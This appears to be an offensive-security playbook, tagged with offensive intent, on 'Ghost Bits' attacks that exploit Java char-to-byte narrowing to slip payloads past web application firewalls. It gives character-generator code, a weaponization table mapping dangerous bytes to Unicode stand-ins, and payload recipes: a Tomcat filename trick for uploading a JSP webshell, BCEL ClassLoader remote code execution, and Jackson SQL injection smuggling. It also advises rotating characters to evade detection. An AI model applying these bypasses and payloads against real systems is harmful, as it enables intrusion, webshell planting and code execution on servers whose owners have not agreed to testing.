---
name: playbook-src-ghost-bits-cast-test
description: "ghost-bits-cast-attack"
tags: [playbook, src-hunting, ghost, bits, cast]
intent: offensive
---
# ghost-bits-cast-attack

# Ghost Bits / Cast Attack — Java char to byte Narrowing Playbook


## 1. ONE-MINUTE MENTAL MODEL

Java's `char` is a **16-bit** unsigned integer (UTF-16 code unit). Almost
every wire protocol — HTTP/1.1, SMTP, Redis RESP, file paths, raw byte
streams — is **8-bit** byte oriented. The right way to bridge them is
explicit charset encoding:

```
// Correct: explicit UTF-8, multi-byte chars become multi-byte sequences
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
out.write(bytes);
```

Tons of legacy code, framework internals, and "fast path" optimizations skip
this and silently narrow:

```
// Dangerous: high 8 bits silently dropped
byte b = (byte) ch;          // 0x966A -> 0x6A
out.write(ch);               // ByteArrayOutputStream.write(int) keeps low 8 bits
dos.writeBytes(str);         // DataOutputStream loops char->byte cast
int v = ch & 0xFF;           // explicit low-byte mask
```

The lost high 8 bits are the **Ghost Bits**. They turn a multi-byte
Unicode character into a single attacker-chosen ASCII byte at the protocol
layer.

```
View A (string layer: WAF / business validation / logs)
  sees: 陪 阮 严 灵 瘍 瘊 ...   "harmless Unicode garbage, allow"
                  |
                  v       silent narrowing somewhere in the call stack
View B (byte layer: protocol / file system / parser / class loader)
  sees: j  .  %  u  \r \n ...  "executes the dangerous semantics"

The boundary is breached at the exact moment "view A" and "view B" disagree.
```

Mathematical formulation: to make View B see byte `T`, pick any
`k in 0x01..0xFF` and use:

```
c = chr((k << 8) | T)
```

That gives you **255 candidate Unicode characters per dangerous byte** —
plenty of room to dodge any signature-based blacklist.

---

## 2. THREE ROOT-CAUSE FAMILIES

The Ghost Bits umbrella covers three distinct underlying bugs. Distinguishing
them tells you both *which payload shape* to send and *what to grep for* in
source.

### Family A — Real high-bit truncation (classic Ghost Bits)

The narrowing is literal and unconditional.

```java
// Pattern A1: explicit cast
byte b = (byte) ch;

// Pattern A2: bitwise mask
int v = ch & 0xFF;
int v = ch & 255;

// Pattern A3: OutputStream.write(int) keeps low 8 bits only
out.write(ch);
baos.write(ch);

// Pattern A4: DataOutputStream.writeBytes(String) iterates chars,
//             writing low byte of each
dos.writeBytes(str);

// Pattern A5: deprecated APIs that still exist in old code
String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin);
new StringBufferInputStream(str);
raf.writeBytes(str);
```

Typical impact: Tomcat `filename*`, Apache BCEL ClassLoader, Lettuce Redis
writer, SMTP CRLF in Angus Mail, HTTPCLIENT-1974 header injection.

### Family B — Bit-arithmetic folding (illegal char becomes legal)

A "fast" hex / base64 / charset decoder uses bit tricks instead of strict
range checks, so an illegal character collapses onto a legal one.

```java
// Jetty TypeUtil.fromHexDigit (simplified)
private static int fromHexDigit(char c) {
    int x = c & 0x1F;          // keep low 5 bits
    x += (c >> 6) * 25;
    x -= 16;
    return x;                  // expected 0..15, but no range check
}
```

Worked example: feed `>` (0x3E):

```
0x3E & 0x1F = 0x1E = 30
(0x3E >> 6) * 25 = 0
30 + 0 - 16 = 14 = 0xE
```

So `%2>` is silently parsed as `%2E` = `.`. The same algebra makes `%2^`,
`%2~` etc. equivalent to other hex digits.

Typical impact: Openfire CVE-2023-32315, GeoServer CVE-2024-36401, generic
URL-decode WAF bypass.

### Family C — Lax Unicode normalization

The decoder accepts Unicode characters that happen to be classified as
"digit" or that map to a hex value via a `& 0xFF` lookup — even though they
were never meant to participate in protocol parsing.

```java
// Fastjson: too permissive
Character.digit(c, 16);   // accepts Thai, Punjabi, fullwidth digits

// Jackson: index by low 8 bits into an ASCII-only table
return sHexValues[ch & 0xff];

// Generic: fullwidth normalization
// '2' (U+FF12) -> '2', 'e' (U+FF45) -> 'e'
```

Typical impact: Fastjson `\u` and `\x` escape bypass, fullwidth URL-encoded
path traversal, Jackson `charToHex` SQLi smuggling.

---

## 3. CHARACTER GENERATOR

Build any Ghost Bits character on the fly. This is the single function every
agent should keep in mind:

```python
# Python
def ghost(target_byte: int, k: int = 1) -> str:
    """Return a Unicode char whose low 8 bits equal target_byte."""
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))

# 255 candidates per byte, e.g. for '.' (0x2E):
candidates = [ghost(0x2E, k) for k in range(1, 256)]
# 阮(U+962E), Ⱦ?-prefixed-..., etc.
```

```yak
// Yaklang (for poc.HTTP / fuzz)
func ghost(targetByte, k) {
    return string(rune(((k & 0xFF) << 8) | (targetByte & 0xFF)))
}
ghostJ = ghost(0x6A, 0x96)   // returns "陪"
```

Selection guidance:

- Avoid surrogate range `0xD800..0xDFFF` (high byte 0xD8..0xDF) — those are
  not valid scalar values and will be replaced by the JVM string decoder
  before reaching the narrowing site, defeating the bypass.
- Prefer characters that survive the application's own charset round-trip
  (Latin-Extended, CJK Unified Ideographs, Enclosed CJK Letters and Months,
  Hangul). If the request body uses UTF-8, these all encode cleanly into
  multi-byte sequences that no WAF rule recognizes as `.`, `/`, `j`, etc.
- Rotate `k` between requests so signature based learning cannot pin a single
  character to a single attack.

---

## 4. DANGEROUS-BYTE TO GHOST-CHARACTER MAP

Compact red-team weaponization table. For every byte the attacker actually
needs, one verified Unicode char is given; substitute another `k` if the WAF
later learns the example.

| Target byte | Hex  | Used for                              | Ghost char | Code point |
|-------------|------|---------------------------------------|------------|------------|
| `\t`        | 0x09 | header folding, parser confusion      | `ĉ`        | U+0109     |
| `\n`        | 0x0A | CRLF injection, log injection         | `瘊`       | U+760A     |
| `\r`        | 0x0D | CRLF injection, request smuggling     | `瘍`       | U+760D     |
| ` `         | 0x20 | header break, command separator       | `Ġ`        | U+0120     |
| `"`         | 0x22 | string break in JSON / quoted-printable | `Ģ`     | U+0122     |
| `%`         | 0x25 | URL encoding prefix, second decode    | `严`       | U+4E25     |
| `&`         | 0x26 | parameter separator                   | `Ȧ`        | U+0226     |
| `'`         | 0x27 | SQL string break                      | `ȧ`        | U+0227     |
| `(`         | 0x28 | EL/SpEL/OGNL syntax                   | `Ȩ`        | U+0228     |
| `)`         | 0x29 | EL/SpEL/OGNL syntax                   | `ȩ`        | U+0229     |
| `.`         | 0x2E | path traversal, extension             | `阮`       | U+962E     |
| `/`         | 0x2F | path separator                        | `丯`       | U+4E2F     |
| `0`         | 0x30 | hex digit construction                | `丰`       | U+4E30     |
| `1`         | 0x31 | hex digit construction                | `失`       | U+5931     |
| `2`         | 0x32 | hex digit construction                | `甲`       | U+7532     |
| `3`         | 0x33 | hex digit construction                | `耳`       | U+8033     |
| `;`         | 0x3B | command separator, header continuation | `Ȼ`       | U+023B     |
| `<`         | 0x3C | XSS / XML tag start                   | `ȼ`        | U+023C     |
| `=`         | 0x3D | parameter / header value              | `Ƚ`        | U+023D     |
| `>`         | 0x3E | XSS / XML tag end                     | `Ⱦ`        | U+023E     |
| `@`         | 0x40 | Fastjson `@type`, mail address        | `ŀ`        | U+0140     |
| `a`         | 0x61 | keyword `class`, alphabet             | `ᙡ`        | U+1661     |
| `c`         | 0x63 | keyword `class`, `cmd`                | `㹣`       | U+3E63     |
| `e`         | 0x65 | hex digit                             | `来`       | U+6765     |
| `j`         | 0x6A | extension `.jsp`                      | `陪`       | U+966A     |
| `l`         | 0x6C | keyword `class`, `closure`            | `౬`        | U+0C6C     |
| `n`         | 0x6E | keyword `Runtime`, `union`            | `陮`       | U+966E     |
| `s`         | 0x73 | keyword `class`, `select`             | `⑳`        | U+2473     |
| `t`         | 0x74 | keyword `Runtime`, `type`             | `Ŵ`        | U+0174     |
| `u`         | 0x75 | `\u` escape introducer                | `灵`       | U+7075     |

Workflow tip: keep the ASCII `Ŀ`, `ȧ`, `ȼ`, etc. variants for tight HTTP
header contexts (one byte UTF-8 expansion stays smaller); use CJK like `阮`,
`陪`, `严` when you want to bias the WAF "this is just text" classifier.

---

## 5. PER-COMPONENT PAYLOAD RECIPES

Every recipe shows the dual view: what the WAF inspects vs. what the backend
actually executes. This is the only reliable way to explain *why* the payload
goes through.

### 5.1 Tomcat `RFC2231Utility` — file upload Webshell (Family A)

Trigger: any endpoint that accepts multipart upload and Tomcat parses
`Content-Disposition: ... filename*=UTF-8''...`. Tomcat's RFC2231 decoder
casts each non-percent character directly to byte, dropping the high 8 bits.

Payload:

```
Content-Disposition: attachment; filename*=UTF-8''1.陪sp
```

| Stage                  | Filename it sees         |
|------------------------|--------------------------|
| WAF / extension filter | `1.陪sp` (not `.jsp`, allow) |
| Tomcat RFC2231 decoder | `陪` -> low byte 0x6A -> `j` |
| File system            | `1.jsp`                  |

Combine with traversal characters from section 4 (`阮`, `丯`) when the upload
target directory is fixed but the application accepts a `filename*`.

### 5.2 Apache Commons BCEL — ClassLoader RCE (Family A)

Trigger: any sink that resolves a class name through `BCEL` (`$$BCEL$$...`)
or any code that decodes BCEL via the `JavaReader` -> `ByteArrayOutputStream`
loop.

Vulnerable shape:

```java
ByteArrayOutputStream bos = new ByteArrayOutputStream();
JavaReader jr = new JavaReader(new CharArrayReader(userChars));
while ((ch = jr.read()) >= 0) {
    bos.write(ch);     // low 8 bits only
}
```

Attack: wrap each byte of the malicious BCEL bytecode into a Unicode
character whose low 8 bits equal that byte. The decoded byte stream is a
valid BCEL class; the WAF sees a long blob of CJK text without `$$BCEL$$`
keywords or class signatures.

| View | Content |
|------|---------|
| WAF  | `$$BCEL$$` followed by random looking CJK |
| BCEL | standard BCEL class file bytes → JVM defineClass → RCE |

Defense for blue team: a WAF inspecting BCEL must replicate the
`bos.write(ch)` semantics on each character before pattern matching.

### 5.3 Jackson `charToHex` — SQLi smuggling (Family C)

Trigger: any Jackson-parsed JSON field whose value is later embedded in SQL
or another parser. Jackson resolves `\uXXXX` digits via:

```java
private static final int[] sHexValues = new int[128];
public static int charToHex(int ch) {
    return sHexValues[ch & 0xFF];   // mask first, lookup second
}
```

Any non-ASCII character whose low 8 bits land on a populated index returns
that hex digit. The WAF sees gibberish; Jackson reconstructs an ASCII payload.